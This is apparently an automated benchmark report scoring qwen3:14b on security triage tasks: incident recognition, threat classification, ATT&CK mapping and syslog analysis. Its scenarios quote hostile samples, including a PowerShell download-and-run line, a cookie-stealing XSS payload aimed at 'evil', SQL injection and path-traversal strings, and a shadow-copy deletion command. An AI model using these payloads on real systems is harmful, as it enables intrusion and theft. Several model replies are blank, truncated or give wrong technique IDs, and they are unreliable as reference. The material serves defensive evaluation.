# Cybersecurity benchmark — `qwen3:14b`
Model: `qwen3:14b`
Run started: 2026-05-06 01:50:13

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 5 | 7 | 71% |
| Threat classification | 5 | 7 | 71% |
| MITRE ATT&CK mapping | 1 | 10 | 10% |
| Syslog triage (raw) | 5 | 8 | 62% |
| Syslog triage (drain3) | 6 | 8 | 75% |
| **Overall (with drain3)** | **17** | **32** | **53%** |

## Resource usage

Latency in seconds. GPU util/memory from `nvidia-smi`, CPU/RAM from `psutil`. Sampled every 250ms during each model call; peak is the max sample within the window.

| Section | n | Total s | Avg s | p50 s | p95 s | Max s | Peak GPU% | Avg GPU% | Peak GPU MB | Peak CPU% | Avg CPU% | Peak RAM MB |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| Incident | 7 | 33.4 | 4.77 | 4.31 | 5.11 | 9.24 | 92% | 69% | 23881 | 28% | 10% | 37617 |
| Threat | 7 | 30.6 | 4.37 | 4.66 | 5.08 | 5.09 | 93% | 80% | 14276 | 40% | 11% | 33723 |
| MITRE | 10 | 46.5 | 4.65 | 5.03 | 5.08 | 5.09 | 93% | 87% | 14276 | 55% | 9% | 33024 |
| Syslog (raw) | 8 | 35.4 | 4.42 | 5.11 | 5.14 | 5.14 | 93% | 86% | 14276 | 56% | 11% | 34132 |
| Syslog (drain3) | 8 | 35.4 | 4.43 | 4.75 | 5.06 | 5.19 | 93% | 76% | 14276 | 43% | 11% | 34755 |
| **Overall** | **40** | **181.4** | **4.53** | **5.03** | **5.14** | **9.24** | **93%** | **80%** | **23881** | **56%** | **10%** | **37617** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — PASS (9.2s · GPU 90%/23881MB · CPU 28% · RAM 37617MB)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Benign  
Normal login and email access during typical work hours from a known IP address indicate routine user activity.

### INC-2 — expected: **incident** — PASS (2.8s · GPU 91%/14274MB · CPU 15% · RAM 33077MB)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident  
Unusual location, unexpected time, and rapid escalation of RDP sessions strongly indicate unauthorized access and potential exploitation.

### INC-3 — expected: **incident** — PASS (4.3s · GPU 91%/14274MB · CPU 16% · RAM 33061MB)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident  
The high volume of login attempts from numerous IPs combined with successful admin logins indicates a brute-force attack and unauthorized access.

### INC-4 — expected: **benign** — PASS (3.2s · GPU 91%/14276MB · CPU 6% · RAM 33024MB)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Benign. The consistent, scheduled backup with no anomalies in timing, size, or exit code aligns with normal operational behavior.

### INC-5 — expected: **incident** — FAIL (5.1s · GPU 92%/14276MB · CPU 19% · RAM 33044MB)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: 

### INC-6 — expected: **benign** — PASS (3.7s · GPU 92%/14276MB · CPU 16% · RAM 33029MB)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Benign. The scenario describes standard development and testing practices with no indicators of security compromise.

### INC-7 — expected: **incident** — FAIL (5.1s · GPU 91%/14276MB · CPU 15% · RAM 33012MB)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: 

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (4.1s · GPU 92%/14276MB · CPU 40% · RAM 33000MB)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: **Ransomware (Lockbit variant)**  
Files are encrypted and renamed with a .lockbit extension, with a ransom note demanding Bitcoin for decryption keys. Lockbit is a known ransomware group that targets organizations, often using double extortion tactics.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (5.1s · GPU 92%/14276MB · CPU 13% · RAM 33008MB)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: **Business Email Compromise (BEC)**  
Attackers impersonate a high-level executive (e.g., CFO

_Match_: 'bec'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (3.4s · GPU 93%/14276MB · CPU 18% · RAM 33547MB)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: **SQL Injection**  
The attacker is attempting to bypass authentication by injecting a malicious SQL query. The `OR '1'='1'--` ensures the condition is always true, allowing unauthorized access.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (3.2s · GPU 91%/14276MB · CPU 14% · RAM 33723MB)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: **Reflected XSS**  
The app reflects unencoded user input into HTML, allowing an attacker to inject malicious scripts (e.g., stealing cookies) that execute in the victim's browser.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — FAIL (5.1s · GPU 89%/14276MB · CPU 12% · RAM 33172MB)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: 

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — FAIL (5.1s · GPU 92%/14276MB · CPU 25% · RAM 33207MB)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: 

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (4.7s · GPU 92%/14276MB · CPU 25% · RAM 33111MB)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: Supply chain attack.  
The attacker compromised the vendor's build server to inject a backdoor into a legitimate update, exploiting trust in the vendor's signing process to distribute malware to customers.

_Match_: 'supply chain'

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `(none)` | FAIL |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1056.001` | FAIL |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1053` | PASS |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `(none)` | FAIL |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1054.001` | FAIL |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1070.005` | FAIL |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `(none)` | FAIL |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1116` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `(none)` | FAIL |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `(none)` | FAIL |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — FAIL (5.0s · GPU 93%/14276MB · CPU 24% · RAM 33024MB)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: 

_Detected IDs_: (none)

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — FAIL (4.1s · GPU 91%/14276MB · CPU 7% · RAM 33008MB)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: T1056.001 - Dumping Windows LSASS Memory

_Detected IDs_: T1056.001

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — PASS (3.6s · GPU 93%/14276MB · CPU 15% · RAM 33011MB)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: T1053.001 - Scheduled Task/Job

_Detected IDs_: T1053

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — FAIL (5.1s · GPU 92%/14276MB · CPU 21% · RAM 33018MB)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: 

_Detected IDs_: (none)

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — FAIL (5.0s · GPU 90%/14276MB · CPU 55% · RAM 33005MB)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: T1054.001 - Registry Run Keys / Startup Folder

_Detected IDs_: T1054.001

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — FAIL (4.2s · GPU 92%/14276MB · CPU 38% · RAM 32984MB)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: T1070.005 - Exfiltration Over DNS: TXT Record

_Detected IDs_: T1070.005

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (5.1s · GPU 92%/14276MB · CPU 26% · RAM 32992MB)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: 

_Detected IDs_: (none)

### ATT-8 — accepted IDs: ['T1490'] — FAIL (4.3s · GPU 93%/14276MB · CPU 12% · RAM 33005MB)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: T1116 - Delete Volume Shadow Copies

_Detected IDs_: T1116

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — FAIL (5.0s · GPU 93%/14276MB · CPU 15% · RAM 32967MB)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: 

_Detected IDs_: (none)

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — FAIL (5.1s · GPU 92%/14276MB · CPU 20% · RAM 32974MB)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: 

_Detected IDs_: (none)

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (5.1s · GPU 92%/14276MB · CPU 18% · RAM 32994MB)
_Reply_: Incident  
Multiple failed SSH login attempts for invalid users followed by a successful login from the same IP address indicate a brute-force attack attempt, which is a security incident.

**With drain3 summary** — PASS (4.4s · GPU 93%/14276MB · CPU 14% · RAM 33018MB)
_Reply_: Incident  
The high [x6] count for failed password attempts from the same IP address indicates a brute-force attack, which is a clear security incident.

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — PASS (2.3s · GPU 92%/14276MB · CPU 21% · RAM 33039MB)
_Reply_: Benign  
These logs represent a standard SSH login and session creation for user alice from an internal IP address, which is typical for authorized user activity.

**With drain3 summary** — PASS (4.6s · GPU 92%/14276MB · CPU 43% · RAM 33055MB)
_Reply_: Benign  
The low [x1] template counts and routine activities (successful SSH pubkey login, session creation) align with normal user behavior, not attack patterns.

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — PASS (2.4s · GPU 90%/14276MB · CPU 12% · RAM 33076MB)
_Reply_: Benign  
These logs represent standard system maintenance activities, including scheduled cron jobs and normal rsyslogd operations, with no indicators of unauthorized access or malicious behavior.

**With drain3 summary** — PASS (2.8s · GPU 90%/14276MB · CPU 7% · RAM 33073MB)
_Reply_: Benign  
The low [x1] counts and templates correspond to routine system activity (cron jobs, rsyslog reload, session closure), which are normal maintenance operations.

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — FAIL (5.1s · GPU 92%/14276MB · CPU 12% · RAM 33081MB)
_Reply_: 

**With drain3 summary** — PASS (4.8s · GPU 90%/14276MB · CPU 15% · RAM 33055MB)
_Reply_: Incident  
The [x3] count on the attack-shaped template (SQL injection probes) indicates multiple malicious attempts to exploit the application.

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — FAIL (5.1s · GPU 93%/14276MB · CPU 17% · RAM 33036MB)
_Reply_: Benign  
A legitimate user (bob) added a service account (svc_backup) to the sudo

**With drain3 summary** — FAIL (5.2s · GPU 91%/14276MB · CPU 24% · RAM 33028MB)
_Reply_: 

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (5.1s · GPU 91%/14276MB · CPU 13% · RAM 33048MB)
_Reply_: Incident  
Multiple path traversal attempts to access sensitive system files (e.g., /etc/passwd, /etc/shadow, /etc/hosts) with some successful responses (200), indicating

**With drain3 summary** — FAIL (5.1s · GPU 92%/14276MB · CPU 11% · RAM 33014MB)
_Reply_: 

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — PASS (5.1s · GPU 92%/14276MB · CPU 20% · RAM 33055MB)
_Reply_: Benign  
These log entries represent normal user activity accessing an internal dashboard

**With drain3 summary** — PASS (3.6s · GPU 91%/14276MB · CPU 15% · RAM 33047MB)
_Reply_: Benign  
The [x3] template count indicates routine HTTP activity with standard 200 responses, consistent with normal user interactions (dashboard access, static assets, API calls) rather than attack patterns.

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — FAIL (5.1s · GPU 92%/14276MB · CPU 56% · RAM 34132MB)
_Reply_: 

**With drain3 summary** — PASS (5.0s · GPU 93%/14276MB · CPU 23% · RAM 34755MB)
_Reply_: Incident  
The high [x5] count of identical failed login attempts (EventID 4625) with consistent parameters indicates a brute-force attack pattern, which is a strong signal of an incident.
